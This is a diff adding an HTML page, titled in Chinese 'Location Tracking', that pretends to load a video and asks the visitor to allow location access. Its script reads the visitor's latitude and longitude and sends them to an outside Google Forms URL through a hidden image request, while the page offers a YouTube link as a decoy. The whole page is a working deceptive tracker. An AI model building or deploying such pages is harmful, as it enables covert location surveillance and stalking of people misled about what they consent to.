@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>定位追蹤</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+            background-color: #f4f4f9;
+        }
+        h1 {
+            color: #333;
+        }
+        p {
+            color: #555;
+        }
+    </style>
+</head>
+<body>
+    <h1>正在載入影片，請允許定位...</h1>
+    <p>若未自動跳轉，請手動點擊以下連結：</p>
+    <a href="https://www.youtube.com/watch?v=YmC53o2_gWk" target="_blank">觀看影片</a>
+
+    <script>
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(function(position) {
+                var latitude = position.coords.latitude;
+                var longitude = position.coords.longitude;
+                var formUrl = 'https://forms.gle/BE9bY4YwfXUGRGjV9?entry.1234567890=' + latitude + '&entry.0987654321=' + longitude;
+                var img = new Image();
+                img.src = formUrl;
+                document.body.innerHTML = '<h1>定位成功，感謝您的配合！</h1>';
+            }, function(error) {
+                alert('定位失敗，請允許定位權限。');
+            });
+        } else {
+            alert('您的瀏覽器不支援定位功能。');
+        }
+    </script>
+</body>
+</html>
